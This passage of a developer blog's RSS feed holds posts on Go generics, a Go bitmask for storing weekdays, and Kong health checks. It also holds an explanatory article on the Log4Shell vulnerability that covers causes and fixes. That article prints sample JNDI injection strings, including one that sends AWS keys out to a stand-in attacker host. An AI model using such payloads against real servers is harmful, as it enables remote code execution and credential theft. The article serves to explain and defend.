
func main() {
	list := []int32{4, 3, 1, 5, 6}
	listFloat := []float32{4.3, 7.6, 2.4, 1.5}

	fmt.Println(BubbleSort(list))
	fmt.Println(BubbleSort(listFloat))
}</code></pre>
</div>
<p class="maps-to-line">If you like, you can read the same article on my <a title="https://rezwanul-haque.hashnode.dev/generics-in-golang-118" href="https://rezwanul-haque.hashnode.dev/generics-in-golang-118" data-from-md="" rel="nofollow noopener" target="_blank">Personal blog</a></p>
<blockquote class="maps-to-line">
<h4 id="you-can-read-my-other-blog-posts-here">You can read my other blog-posts <a title="https://rezwanul-haque.hashnode.dev/" href="https://rezwanul-haque.hashnode.dev/" data-from-md="" rel="nofollow noopener" target="_blank">Here</a></h4>
</blockquote>
<p class="maps-to-line">So in conclusion we can say, Generics can give us lots of help if we can use them in development. Also, we don&#8217;t need to copy/paste the same functionality again and again. Hopefully, after the &gt;go 1.18 and above we can start using Generics. With this feature, we as Golang developers don&#8217;t have to copy/paste functions for different types with the same functionality. We can reuse our code more efficiently with our loved programming language.</p>
]]></content:encoded>
					
					<wfw:commentRss>/blog/generics-in-golang-1-18/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Apache Log4j aka Log4Shell Vulnerability &#8211; Remote Code Execution</title>
		<link>/blog/apache-log4j-aka-log4shell-vulnerability-remote-code-execution/</link>
					<comments>/blog/apache-log4j-aka-log4shell-vulnerability-remote-code-execution/#comments</comments>
		
		<dc:creator><![CDATA[Rezwanul Haque]]></dc:creator>
		<pubDate>Thu, 30 Dec 2021 18:35:45 +0000</pubDate>
				<category><![CDATA[Data]]></category>
		<category><![CDATA[Personal]]></category>
		<category><![CDATA[Programming & Development]]></category>
		<category><![CDATA[Technology]]></category>
		<category><![CDATA[Java]]></category>
		<category><![CDATA[logging]]></category>
		<category><![CDATA[Security]]></category>
		<category><![CDATA[Vulnerability]]></category>
		<guid isPermaLink="false">/?p=5037</guid>

					<description><![CDATA[Critical Severity Web Vulnerability When it comes to open-source projects there is a general assumption, as it&#8217;s an open-source project, many members(sometimes a lot) are watching and constantly reviewing this codebase so it should have fewer errors and vulnerabilities. But it&#8217;s normal for us programmers to make mistakes. This article discusses a recently found vulnerability [&#8230;]]]></description>
										<content:encoded><![CDATA[<h3 id="critical-severity-web-vulnerability">Critical Severity Web Vulnerability</h3>
<p>When it comes to open-source projects there is a general assumption, as it&#8217;s an open-source project, many members(sometimes a lot) are watching and constantly reviewing this codebase so it should have fewer errors and vulnerabilities. But it&#8217;s normal for us programmers to make mistakes. This article discusses a recently found vulnerability in a very widely used library in Java, this is used for logging named <strong>Apache Log4j</strong> also known as <strong>Log4j</strong>.</p>
<blockquote><p>Vulnerabilities are discovered all the time. Whenever a vulnerability is found, it gets patched by the community members as soon as possible.</p></blockquote>
<p>I learned a lot from <a title="https://www.youtube.com/watch?v=uyq8yxWO1ls" href="https://www.youtube.com/watch?v=uyq8yxWO1ls" data-from-md="" rel="nofollow noopener" target="_blank">this video</a>. Anyone reading this article may refer to his videos for in-depth learning. Also, I&#8217;m using his used examples here too.</p>
<p>Thanks, <a href="https://www.linkedin.com/in/rafat-ibn-rashid/" rel="nofollow noopener" target="_blank">Rafat Rashid</a> for proofreading my post</p>
<h2 id="what-is-log4j">What is Log4j?</h2>
<p>Log4j is a very popular java logging library that is used for logging data from out program into files or console shells when something goes wrong, during debugging, errors are raised, API request body(payload), etc to lookup these logged data to troubleshoot or get better insights. This is usually what typical logging libraries are used for. This <code class="inline-code">Log4j</code> library was so popular that even if a java based codebase doesn&#8217;t use it directly, there is a very high possibility that some direct or indirect dependencies are using it. Now, because of the high usage of <code class="inline-code">Log4j</code>, the recently found vulnerability raises some serious concern for the java based applications.</p>
<blockquote>
<h4 id="any-java-codebase-that-uses-log4j-can-be-hacked-unless-you-are-using-their-latest-patch-version2171-after-this-vulnerability-was-found">Any <code class="inline-code">java</code> codebase that uses <code class="inline-code">Log4j</code> can be hacked unless you are using their latest patch version(&gt;=2.17.1) after this vulnerability was found.</h4>
</blockquote>
<p>All enterprise and other application developers are now racing to put this patch, updating their <code class="inline-code">Log4j</code> version to the recently patched version which is 2.17.1 or higher(in the future) to avoid this vulnerability in their programs. Upgrading the <code class="inline-code">Log4j</code> or any other package may lead to more bugs if you don&#8217;t know what you&#8217;re doing. As we speak many packages apply these patches to the code where they use <code class="inline-code">Log4j</code>. But there&#8217;s a possibility that some may not apply this patch which makes us vulnerable if we use that third-party library package in our codebase.</p>
<blockquote><p>Note: Hackers are also racing to exploit their targets before applications apply this patch to their codebase and deploy it into production.</p></blockquote>
<p>Those of us who are thinking, well, we don&#8217;t use <code class="inline-code">Log4j</code> in our codebase so this vulnerability isn&#8217;t going to affect us. Well, this is where the fun begins. Because of the popularity of <code class="inline-code">Log4j</code>, the third-party libraries and their direct/indirect dependent libraries may use log4j to log their stuff.</p>
<blockquote><p>snyk &#8211; A developer security company &#8211; found out that almost 60% plus java applications out there use <code class="inline-code">Log4j</code> indirectly.</p></blockquote>
<p>Using those usages of log4j in the dependencies of your application, your application falls under the threat of this vulnerability as well. So everyone needs to apply this patch to their codebase and redeploy their application into production.</p>
<p>Those of us who are still thinking, we don&#8217;t have to put this patch or this vulnerability has nothing to do with us. There&#8217;s a scoring system called <code class="inline-code">CVSS</code> which stands for <strong>Common Vulnerability Scoring System</strong>. It provides a way to capture the principal characteristics of a vulnerability and produce a numerical score reflecting its severity. This <code class="inline-code">CVSS</code> system rated this vulnerability 10 out of 10 which is pretty scary for java developers. This vulnerability has the highest score possible. And why is that? The reason for this is, this vulnerability enables what is known as <strong>RCE</strong>.</p>
<h2 id="what-is-rce">What is RCE?</h2>
<p><code class="inline-code">RCE</code> stands for <strong>Remote Code Execution</strong>. What this means is, hackers are allowed to execute any code on your machine by hacking into your application which uses <code class="inline-code">log4j</code> directly or indirectly. This vulnerability was nick-named as <code class="inline-code">Log4Shell</code> and the reason is, anyone can open a shell on your server and issue commands. Scary right?</p>
<p>Let&#8217;s explain how we arrive at this scary problem. There are a few things that lead to this vulnerability altogether. Let&#8217;s go one by one.</p>
<h4 id="1-log4j-allow-us-to-log-expressions">1. Log4j allow us to log expressions</h4>
<div class="joplin-editable">
<pre><code class="language-java">final Logger logClient = LogManager.getLogger(...);
logClient.Error(&quot;error message: {}&quot;, error.getMessages());</code></pre>
</div>
<p>In the first line, we get the logger client and then we log the error messages. So we are plugging the error object into the string. Java will run this <code class="inline-code">error.getMessages()</code> code and send this value which will be used by <code class="inline-code">log4j</code> to plug that error value into the string. We&#8217;ll see an output that will contain the error string and whatever the <code class="inline-code">error.getMessages</code> returns into that <code class="inline-code">{}</code> curly braces which are called <strong>string interpolation</strong> and going to print it.</p>
<p>Another example,</p>
<div class="joplin-editable">
<pre><code class="language-java">logClient.Info(&quot;user {} has logged in using id {}&quot;, map.get(&quot;Name&quot;), user.getId());</code></pre>
</div>
<p>As long as the value passed here log4j will print it and it&#8217;s the standard logging mechanism by most of the logging library, there&#8217;s nothing special, right? This mechanism is not the problem here.</p>
<h4 id="2-jndi">2. JNDI</h4>
<p><code class="inline-code">JNDI</code> stands for <strong>Java Naming and Directory Interface</strong>. This allows us to store java objects to a remote location and then serialize them to your <code class="inline-code">JVM</code> which is kind of streaming to <code class="inline-code">JVM</code>. As scary as it seems, this technology has been in existence from the era before rest API and it was quite popular at that time. This was a redistributed java system that would work with each other to communicate. This has lost its popularity now but it still exists in java for backward compatibility reasons.<br />
Let&#8217;s have an example,</p>
<div class="joplin-editable">
<pre><code class="language-">ldap://192.168.1.22:8080/O=Rezwanul,C=BD</code></pre>
</div>
<p>This is an active directory link that uses <code class="inline-code">LDAP</code> protocol and we can invoke the URL and get a serialized java object in return from somewhere from a remote server. In our example, it is most probably the profile object we get from the active directory. This has nothing to do with <code class="inline-code">log4j</code>, It&#8217;s a Java feature that has been in java for years. We can enable/disable it, it&#8217;s encouraged to disable it. It hasn&#8217;t been removed from java because java never deprecates anything for backward compatibility reasons, for example, even codes from 1995(java first released year) code can be run on the latest JVM and latest Java compiler.</p>
<blockquote>
<h4 id="this-feature-is-harmless-in-and-as-of-itself">This feature is harmless in and as of itself</h4>
</blockquote>
<h4 id="3-jndi-lookup-in-log-messages">3. JNDI lookup in log messages</h4>
<p>In 2013, A feature was introduced in Log4j by a contributor, which uses the <code class="inline-code">JNDI</code> lookups from the logging messages. A good use case for this feature would be a centralized logging configuration from a config server and we want to serialize that configuration using <code class="inline-code">JNDI</code> lookups.<br />
Let&#8217;s go back to our first log message example again&#8230;</p>
<div class="joplin-editable">
<pre><code class="language-java">final Logger logClient = LogManager.getLogger(...);
logClient.Error(&quot;error message: {}&quot;, error.getMessages());</code></pre>
</div>
<p>We&#8217;re going to use log message for <code class="inline-code">JNDI</code> lookups</p>
<div class="joplin-editable">
<pre><code class="language-java">final Logger logClient = LogManager.getLogger(...);
logClient.Error(&quot;{}: error: {}&quot;, &quot;${jndi:ldap://logconfig/prefix}&quot;, error.getMessages());</code></pre>
</div>
<p>So what we&#8217;re doing here is, we&#8217;re getting a prefix for the logging message from the configuration server and passing the <code class="inline-code">JNDI</code> URL as an argument. We&#8217;re not passing a value that auto resolves but we&#8217;re passing a URL as a string value but this is not something that JAVA resolves, this is something that we&#8217;re passing to log4j. The difference is <code class="inline-code">log4j</code> does lookups for certain types of strings.<br />
For example,</p>
<div class="joplin-editable">
<pre><code class="language-java">logClient.Error(&quot;insert string here: {}&quot;, &quot;hello world&quot;);</code></pre>
</div>
<p>The above code will insert the <code class="inline-code">hello world</code> string in the curly braces. But the string we&#8217;re passing as an argument has a special syntax like below <code class="inline-code">${jndi:ldap://...}</code></p>
<div class="joplin-editable">
<pre><code class="language-java">logClient.Error(&quot;looks up value and insert: {}&quot;, &quot;${jndi:ldap://...}&quot;);</code></pre>
</div>
<p>This type of value says log4j to look up and resolve for a serialized value and insert it into the curly braces. As the argument says <code class="inline-code">JNDI</code> log4j uses a <code class="inline-code">JNDI</code> lookup and it&#8217;s going to look up the value and insert it into the braces. Another example</p>
<div class="joplin-editable">
<pre><code class="language-java">logClient.Error(&quot;looks up value and insert: {}&quot;, &quot;${env:ENV_VALUE}&quot;);</code></pre>
</div>
<p>As the argument says <code class="inline-code">env</code> log4j uses the environment variable lookups and inserts it into the curly braces.</p>
<blockquote>
<h3 id="this-is-the-vulnerability-were-talking-about-remote-code-executionrce">This is the vulnerability we&#8217;re talking about, <strong>Remote Code Execution(RCE)</strong></h3>
</blockquote>
<p>This feature aka serious bug requested in 2013. To check that <a title="https://issues.apache.org/jira/browse/LOG4J2-313" href="https://issues.apache.org/jira/browse/LOG4J2-313" data-from-md="" rel="nofollow noopener" target="_blank">click here</a>.</p>
<p>Are you wondering how this is a vulnerability? Let&#8217;s give an example<br />
Let&#8217;s say you&#8217;ve got a search page and an end-user can put some search criteria on an input box and submit it and on the server, you&#8217;re logging it, the search term.</p>
<div class="joplin-editable">
<pre><code class="language-java">logClient.Info(&quot;search page: searched issued for {}&quot;, searchTerm);</code></pre>
</div>
<p>With this simple Info log message, we can think about what can go wrong. Nothing right? Let&#8217;s imagine if the search term looks like below <code class="inline-code">${jndi:ldap://want.to.heck/maliciousobject}</code>, What will happen now, what will the simple Info log message do&#8230;</p>
<p><code class="inline-code">log4j</code> will do a <code class="inline-code">JNDI</code> request to whatever domain passed in the search term.<br />
Let&#8217;s use a simple diagram to show what&#8217;s happening</p>
<p><img decoding="async" class="alignnone size-full wp-image-5039" src="/wp-content/uploads/2021/12/RCE.drawio.png" alt="RCE.drawio Apache Log4j aka Log4Shell Vulnerability - Remote Code Execution" width="578" height="413" srcset="/wp-content/uploads/2021/12/RCE.drawio.png 578w, /wp-content/uploads/2021/12/RCE.drawio-480x343.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 578px, 100vw"></p>
<p>What&#8217;s happening here is, someone puts a <code class="inline-code">JNDI</code> URL as the search term and submits the request. The app server which contains that vulnerable log4j version logs the search term. The server now does a <code class="inline-code">JNDI</code> request to that malicious server and gets a serialized malicious object. What this malicious object contains who knows, log4j will take that object, and now your app <code class="inline-code">JVM</code> has a java object which the application didn&#8217;t put in there. That malicious server (well, the malicious people behind that server) now can put a java object in somebody else&#8217;s <code class="inline-code">JVM</code>.</p>
<blockquote>
<h3 id="this-sounds-like-crazy-but-this-is-what-this-vulnerability-is-to-be-exact">This sounds like crazy but This is what this vulnerability is to be exact.</h3>
</blockquote>
<p>So the malicious person, in his malicious java object, can put a static block that contains whatever code he wants and this is going to run it.</p>
<p>Imagine you can insert the java object of your code in the JVM of a popular e-commerce website or JVM of a popular social media website and then you may control everything on that site. Sounds scary&#8230; Adding salt to this to make it more interesting is you can initiate this as many times as you want to execute whatever code you want to run this type of attack. This is also known as <strong>Remote code execution aka RCE</strong></p>
<p>Isn&#8217;t this pattern almost looking like <strong>SQL Injection</strong>? SQL Injection is also a similar vulnerability. In this type of attack, a Malicious user put malicious SQL code which executes itself on your app code. You&#8217;re passing this malicious code as a query param from your app frontend. That&#8217;s why we don&#8217;t string append or didn&#8217;t do resolves on user inputs. We can call this <strong>Log Injection</strong> aka <strong>Log Forgery</strong>. Log injection attack has been happening for quite some time now.</p>
<blockquote>
<h4 id="log-injection-or-log-forgery-is-a-vulnerability-that-arises-when-un-trusted-and-un-validated-input-is-allowed-to-be-printed-in-system-log-files">Log Injection (or Log Forgery) is a vulnerability that arises when un-trusted and un-validated input is allowed to be printed in system log files.</h4>
</blockquote>
<p>Let&#8217;s look at the below search term.</p>
<div class="joplin-editable">
<pre><code class="language-">\nINFO: Looks like a problem with our calculation./nError: rollback transaction for Rezwanul</code></pre>
</div>
<p>This tells us we make a mistake in the calculation and we&#8217;re rollbacking the transaction. In contrast to this, we may decide to refund the user. but this isn&#8217;t the case really, right?<br />
Log injections are easy to figure out and less harmful. We can&#8217;t do considerable damage with it. Compared to this <strong>RCE</strong> will result in a completely different story and cause serious problems.</p>
<h2 id="solving-the-issue">Solving the Issue</h2>
<h3 id="using-jvm-flags">Using JVM flags</h3>
<p>This is the easiest one. Set these <code class="inline-code">JVM</code> flags to <code class="inline-code">false</code></p>
<div class="joplin-editable">
<pre><code class="language-java">com.sun.jndi.ldap.object.trustURLCodebase
com.sun.jndi.rmi.object.trustURLCodebase</code></pre>
</div>
<p>Which is telling java that, do you want to trust code that is coming from a URL that handles JNDI or RMI URL resolves kind of stuff? Set these flags to <code class="inline-code">false</code> and you&#8217;re good to go. After that Java won&#8217;t run any code which is coming from a URL. Java will stop it and Log4j will be stopped from logging it.<br />
Lots of people turn this off as this is scary stuff and yet lots of people out there don&#8217;t even know this exists and they have servers running with this thing turned on and if they have that version of log4j which is vulnerable, may cause serious problems.</p>
<p>Even if these flags are turned off there is still vulnerability. Remember our environment variable resolving example in the above. Most application has some environment variable set up on the server.</p>
<div class="joplin-editable">
<pre><code class="language-java">${jndi:ldap://want.to.heck/${env:AWS_ACCESS_KEY}/${env:AWS_ACCESS_KEY_SECRET}}</code></pre>
</div>
<p>A call with the above example goes out like that, then JVM will resolve those environment variables and then initiate the JNDI request which leads to a security breach on AWS as the AWS keys are exposed. This may lead to a situation where clients experience unwanted bills on AWS. Scary right? We don&#8217;t want anything to happen to our clients, do we?</p>
<p>So here is our next solution:</p>
<h3 id="update-log4j">Update log4j</h3>
<p>We need to update log4j to the latest version(like 2.17.1) which doesn&#8217;t have this vulnerability. This sounds simple but it can be problematic if you have dependencies that depend on something else which don&#8217;t support the latest log4j version you are trying to update. In that case we have to wait for that dependent library to patch log4j, well while we&#8217;re waiting scary things may happen if you want to take that risk.</p>
<h3 id="patch-the-class-directly">Patch the class directly</h3>
<p>So in this approach, we patch the java class directly into our version of log4j or the third-party library which uses log4j and patch it on the server so that we don&#8217;t face the above issue.</p>
<p>If you like, you can read the same article on my<a href="https://rezwanul-haque.hashnode.dev/apache-log4j-aka-log4shell-vulnerability-remote-code-execution" rel="nofollow noopener" target="_blank"> [Personal blog]</a></p>
<p>&gt; #### You can read my other blog-posts <a href="https://rezwanul-haque.hashnode.dev/" rel="nofollow noopener" target="_blank">[Here]</a></p>
<h3 id="use-dependency-constraints-using-gradle">Use Dependency Constraints using Gradle</h3>
<p>This will allow you to forcefully use a version of dependency you define in Gradle. No matter what the version that the dependent library use, you force them to use the version you choose.</p>
<p>In Conclusion, Open Source projects are secure most of the time no doubt about it. But just because it&#8217;s open-source, doesn&#8217;t mean it hasn&#8217;t been exposed to vulnerability. Many people will review contributors code for bugs and vulnerability but We need to ask the question,</p>
<blockquote>
<h3 id="is-the-person-reviewing-a-piece-of-code-is-the-right-person-to-do-that-review-or-not">Is the person reviewing a piece of code is the right person to do that review or not?</h3>
</blockquote>
<p>This log4j vulnerability is out there for almost <strong>9</strong> years, who knows what type of problem it caused in all these years. From a developer&#8217;s perspective, our implemented code may not be buggy at first glance as we don&#8217;t think how a security expert will think on that same implementation.</p>
]]></content:encoded>
					
					<wfw:commentRss>/blog/apache-log4j-aka-log4shell-vulnerability-remote-code-execution/feed/</wfw:commentRss>
			<slash:comments>2</slash:comments>
		
		
			</item>
		<item>
		<title>A Smart Way To Store Weekdays In Database</title>
		<link>/blog/a-smart-way-to-store-weekdays-in-database/</link>
					<comments>/blog/a-smart-way-to-store-weekdays-in-database/#respond</comments>
		
		<dc:creator><![CDATA[Rezwanul Haque]]></dc:creator>
		<pubDate>Wed, 15 Dec 2021 07:55:06 +0000</pubDate>
				<category><![CDATA[Data]]></category>
		<category><![CDATA[Personal]]></category>
		<category><![CDATA[Technology]]></category>
		<category><![CDATA[Databases]]></category>
		<category><![CDATA[Optimization]]></category>
		<guid isPermaLink="false">/?p=4925</guid>

					<description><![CDATA[Optimization techniques for fast query When we work on a specific problem, We first think of the solution for the worst-case scenario which leads to a brute force approach to solving the problem. This is OK most of the time, as we don&#8217;t get much time to think about an optimal solution due to tight [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Optimization techniques for fast query</p>
<p>When we work on a specific problem, We first think of the solution for the worst-case scenario which leads to a brute force approach to solving the problem. This is OK most of the time, as we don&#8217;t get much time to think about an optimal solution due to tight deadlines. In this blog post, We&#8217;re talking about storing weekdays data model problems. First, we go through the problematic approach &#8211; brute force, then optimize our data model so that we can optimize our database tables for the fast queries.</p>
<p>Let&#8217;s give a perspective to our problem first, suppose we are developing an application and in our application, we need to manage branches (e.g branches of a restaurant or supermarket) and each branch has its own weekdays.</p>
<p>So we can design that in an RDBMS database like this, we make a table <code class="inline-code">branches</code> where we store branch-related information and for the weekdays of a specific branch we can store that in a pivot table like <code class="inline-code">branch_weekdays</code> which represents one to many relationships.</p>
<blockquote><p>Thanks <a title="https://www.linkedin.com/in/rafat-ibn-rashid/" href="https://www.linkedin.com/in/rafat-ibn-rashid/" data-from-md="" rel="nofollow noopener" target="_blank">Rafat Rashid</a> for proofreading my post</p></blockquote>
<p><img decoding="async" title="" src="///home/rezwanulhaque/.config/joplin-desktop/resources/24724ae100d14517ac91eea376afa4e7.png?t=1638294625651" data-from-md="" data-resource-id="24724ae100d14517ac91eea376afa4e7" alt="24724ae100d14517ac91eea376afa4e7 A Smart Way To Store Weekdays In Database"><img decoding="async" class="alignnone size-full wp-image-4927" src="/wp-content/uploads/2021/12/branch_weekday.png" alt="branch weekday A Smart Way To Store Weekdays In Database" width="756" height="409" srcset="/wp-content/uploads/2021/12/branch_weekday.png 756w, /wp-content/uploads/2021/12/branch_weekday-480x260.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 756px, 100vw"></p>
<blockquote><p>Note: We&#8217;re storing <code class="inline-code">start_time</code> and <code class="inline-code">end_time</code> in a military format which is why we define the type as <code class="inline-code">int</code></p></blockquote>
<p>In this design, the pivot table can store the days&#8217; info of a branch which represents one to many relationships. For small data, it&#8217;s completely fine as it&#8217;s not going to be a problem.</p>
<p>But just think like this, in the worst case if every branch has 7 days as it&#8217;s a weekday in the table then the table becomes one of the major problems when there are a million rows in the branches table which makes the <code class="inline-code">branch_weekdays</code> table 7 times larger than the branches table. If we have several tables like that in our application and we need to join tables to serve some data, this will be a major problem as it will make our query slow when we need to join these tables.</p>
<h3 id="solutions">Solutions:</h3>
<p>To solve this problem, we use the binary operation to store the days as a mask in the branches table without managing a separate pivot table like below</p>
<p><img decoding="async" class="alignnone wp-image-4928 size-full" src="/wp-content/uploads/2021/12/branches.png" alt="branches A Smart Way To Store Weekdays In Database" width="633" height="318" srcset="/wp-content/uploads/2021/12/branches.png 633w, /wp-content/uploads/2021/12/branches-480x241.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) 633px, 100vw"></p>
<div class="joplin-editable">
<p>Let me explain how we can generate the mask in the branches table. So we all know 7 days makes a whole week and if we flag 0 as Sunday to 6 as Saturday respectively, then we get 0-6 values for each day in a week. While working with binary may initially seem confusing, understanding that each binary place value represents 2<sup class="jop-noMdConv">n</sup>, just as each decimal place represents 10<sup class="jop-noMdConv">n</sup>, should help clarify. Take the number 8 for example:<br />
<b class="jop-noMdConv"><br />
8 × 10<sup class="jop-noMdConv">0</sup> = 8 × 1 = 8<br />
</b><br />
In binary, 8 is represented as 1000. Reading from right to left, the first 0 represents 2<sup class="jop-noMdConv">0</sup>, the second 2<sup class="jop-noMdConv">1</sup>, the third 2<sup class="jop-noMdConv">2</sup>, and the fourth 2<sup class="jop-noMdConv">3</sup>; just like the decimal system, except with a base of 2 rather than 10.<br />
<b class="jop-noMdConv"><br />
2<sup class="jop-noMdConv">0</sup> + 2<sup class="jop-noMdConv">1</sup> + 2<sup class="jop-noMdConv">2</sup> + 2<sup class="jop-noMdConv">3</sup> + 2<sup class="jop-noMdConv">4</sup> + 2<sup class="jop-noMdConv">5</sup> + 2<sup class="jop-noMdConv">6</sup> = 127<br />
</b><br />
If we sum the values, we get 127 as the mask value which means the branch is available in seven days. As we&#8217;ll use the bitwise operation to check whether the current day is available or not in the mask value which makes the operation much faster and we&#8217;re able to save a lot of space too. Also, most importantly, we don&#8217;t face a million rows joining problem.</p>
<p>For this part, I&#8217;ll write the code in <code class="inline-code">Golang</code>, Let me define some utils functions so that we can re-use the code in our application</p>
<pre><code class="language-go">// Contains check if a `needle` can be found in the `haystack` 
// e.g.
// haystack -&gt; []slice
// needle -&gt; int
// result -&gt; bool
func Contains(haystack interface{}, needle interface{}) bool {
	switch reflect.TypeOf(haystack).Kind() {
	case reflect.Slice:
		s := reflect.ValueOf(haystack)

		for i := 0; i &lt; s.Len(); i++ {
			if reflect.DeepEqual(needle, s.Index(i).Interface()) {
				return true
			}
		}
	}
	return false
}</code></pre>
</div>
<div class="joplin-editable"></div>
<pre><code class="language-go">// GenerateAvailabilityMask covert days slice into binary mask value
func GenerateAvailabilityMask(days []int) *int {
    mask := 0
    for i = 0; i &lt; 7; i++ {
        if Contains(days, i) {
            mask += int(math.Pow(2, float64(i)))
        }
    }

    return &amp;mask
}

// input
// [0,1,2,3,4,5,6]
// output
// 127</code></pre>
<p>We need a function to generate weekdays from the mask as we&#8217;ll return days as a comma-separated string</p>
<pre><code class="language-go">// GenerateWeekdays convert mask value into weekdays comma separated string
func GenerateWeekdays(mask int) string {
	var sb strings.Builder
	nbits := 7
	for i := 0; i &lt; nbits; i++ {
		if IsCurrentDayAvailable(mask, i) {
			sb.WriteString(strconv.Itoa(i))
			sb.WriteString(&quot;,&quot;)
		}
	}
	return TrimSuffix(sb.String(), &quot;,&quot;)
}

// input
// 127
// output
// &quot;0,1,2,3,4,5,6&quot;

// TrimSuffix remove suffix from the string if string ends with the suffix
func TrimSuffix(s, suffix string) string {
	if ok := strings.HasSuffix(s, suffix); ok {
		s = s[:len(s)-len(suffix)]
	}
	return s
}

// IsCurrentDayAvailable check if current weekday is available in availability mask
func IsCurrentDayAvailable(mask int, currentDay int) bool {
	x := 1
	return (mask &amp; (x &lt;&lt; currentDay)) &gt; 0
}</code></pre>
<p><code class="inline-code">IsCurrentDayAvailable</code> function is where we apply the <code class="inline-code">bitwise AND (&amp;)</code> operation to find if the current day is available in the mask or not.<br />
To get the current day we can use the below function</p>
<div class="joplin-editable">
<pre><code class="language-go">// CurrentLocalTimeAndWeekday use timezone to get current zone time and weekday and return current weekday &amp; current time in military format 
func CurrentLocalTimeAndWeekday(tz string) (int, int) {
	militaryLayout := &quot;1504&quot;
	loc, err := time.LoadLocation(tz)
	if err != nil {
		logrus.Error(&quot;error occurred when trying to find timezone location.&quot;, err)
		return 0, -1
	}
	t := time.Now().In(loc)
	currentWeekday := int(time.Now().In(loc).Weekday())

	militaryTime, err := strconv.Atoi(t.Format(militaryLayout))
	if err != nil {
		logrus.Error(&quot;error occurred when converting time to military integer format.&quot;)
		return 0, -1
	}
	return militaryTime, currentWeekday
}

</code></pre>
<p>If you like, you can read the same article on my  [<a href="https://rezwanul-haque.hashnode.dev/a-smart-way-to-store-weekdays-in-database" rel="nofollow noopener" target="_blank">Personal blog</a>]</p>
<blockquote><p>#### You can read my other blog-posts [<a href="https://rezwanul-haque.hashnode.dev/" rel="nofollow noopener" target="_blank">Here</a>]</p></blockquote>
<p>So after fetching the mask from the branches table, we can use the <code class="inline-code">CurrentLocalTimeAndWeekday</code> utils function to get the current time and weekday and use the <code class="inline-code">IsCurrentDayAvailable</code> function to determine if the current weekday is available or not in the mask. Also if we need to send Mask as weekdays in the response we can use the <code class="inline-code">GenerateWeekdays</code> function to make the mask as an array of weekdays.</p>
</div>
<p>In Conclusion, We may not often get enough time to think or come up with an optimized solution in the first go but if we put some thought into the problem, we may come up with solutions that make the database query faster as we reach to million rows.</p>
]]></content:encoded>
					
					<wfw:commentRss>/blog/a-smart-way-to-store-weekdays-in-database/feed/</wfw:commentRss>
			<slash:comments>0</slash:comments>
		
		
			</item>
		<item>
		<title>Adding Health Checks And SSL Certificate in Kong Db-Less Mode</title>
		<link>/blog/adding-health-checks-and-ssl-certificate-in-kong-db-less-mode/</link>
		
		<dc:creator><![CDATA[Rezwanul Haque]]></dc:creator>
		<pubDate>Thu, 29 Jul 2021 20:03:19 +0000</pubDate>
				<category><![CDATA[Programming & Development]]></category>
		<category><![CDATA[api]]></category>
		<category><![CDATA[gateway]]></category>
		<category><![CDATA[health-check]]></category>
		<category><![CDATA[kong]]></category>
		<category><![CDATA[SSL certificate]]></category>
		<guid isPermaLink="false">/?p=2623</guid>

					<description><![CDATA[Recently I was working on an open-source project on my current company where all requests come to the API gateway service then the gateway redirects the request to the appropriate service based on the URL pattern. Those who work with Gateway services know there are many of them out there to choose from, e.g. Amazon [&#8230;]]]></description>
										<content:encoded><![CDATA[<p>Recently I was working on an open-source project on my current company where all requests come to the API gateway service then the gateway redirects the request to the appropriate service based on the URL pattern.</p>
<p>Those who work with Gateway services know there are many of them out there to choose from, e.g. Amazon API Gateway, Apigee Edge, Postman, Kong, etc. Kong is one of the most popular ones out there and in our project, we&#8217;re also using Kong as an API gateway.</p>
<p>I&#8217;m new to Kong, Our code base uses Lua programming language to write custom kong plugins.</p>
<h2>What is KONG?</h2>
<p>Kong is Orchestration Microservice API Gateway. Kong provides a flexible abstraction layer that securely manages communication between clients and microservices via API. Also known as an API Gateway, API Middleware, or in some cases Service Mesh. It is available as an open-source project in 2015, its core values are high performance and extensibility.</p>
<blockquote><p>Kong is a Lua application running in Nginx and made possible by the lua-nginx-module.</p></blockquote>
<p>We usually use PostgreSQL or Cassandra depending on our need to store kong configuration. Around 2019, Kong introduces a new mode of writing configuration called Db-Less mode where we use YAML or YML to define kong configuration. which is really good as we don&#8217;t need to manage a separate database application.</p>
<blockquote>
<h4>Note: Kong uses rest API-based endpoints to put data in DB mode but in Db-less mode, most of the admin API is read-only so we have to rely on Docs or example to write YML configuration.</h4>
</blockquote>
<p>This is where the problem starts as Konghq docs don&#8217;t show enough examples or details about how to write the YML configuration. Konghq docs show lots of theoretical details about the feature but the lack of examples makes a newbie like me write YML configuration hard. I spend hours and hours writing just a single YML object which can be a lot easier if konghq docs provide a simple example to write the configuration.</p>
<p>There&#8217;s another way we solve the problem that I later learned, which is using <code>decK</code>, A command-line tool to manage kong configuration. Another way we can also use DB mode to add all the configurations then export all the configurations to YML.</p>
<p>Still, I think, As Db-Less mode is a kong feature, so docs can be updated in the future to make this easier for a newbie like me.</p>
<blockquote><p>As I was working on a gateway service that is already written in Db-less mode, I have to convert the whole configuration to DB mode then export it, which is not an option for me.</p></blockquote>
<h2>The Problem</h2>
<h3>Background</h3>
<blockquote><p>We deployed the app using the <code>AWS ECS</code> service which details I&#8217;ll share in a separate blog post.</p>
<p>As a deployment strategy, we decide to deploy the services in private and attach an SRV record to each service only the Gateway service will be exposed to the public as we&#8217;re using Kong as a load balancer.</p></blockquote>
<p>After deploying the services and we&#8217;re testing if working fine but as we trying to scale down the services we observing the logs and we notice that traffic was sent to an upstream service which was terminating because of the manual scale down we triggered.</p>
<p>After some time we found out we can add Healthcheck to the upstream host so that kong can redirect the request only to healthy targets.</p>
<h3>Question</h3>
<p>How we can do this in Db-Less mode?</p>
<p>As I explain earlier, Konghq docs are not good for this scenario at least for now. I&#8217;ll provide a complete example in this post so If anyone faces the same problem as me. It&#8217;s really hard for me to add the two features in the Db-less mode YML configuration. after hours of searching on the internet and asking in the forum, I was able to add the feature in the configuration.</p>
<h3>Healthcheck Details:</h3>
<p>The objective of the health checks functionality is to dynamically mark targets as healthy or unhealthy, for a given Kong node.</p>
<p>Kong provides 2 types of health check.</p>
<ul>
<li>Active</li>
<li>Passive</li>
</ul>
<p><strong>Active</strong> checks, where a specific HTTP or HTTPS endpoint in the target is periodically requested and the health of the target is determined based on its response;</p>
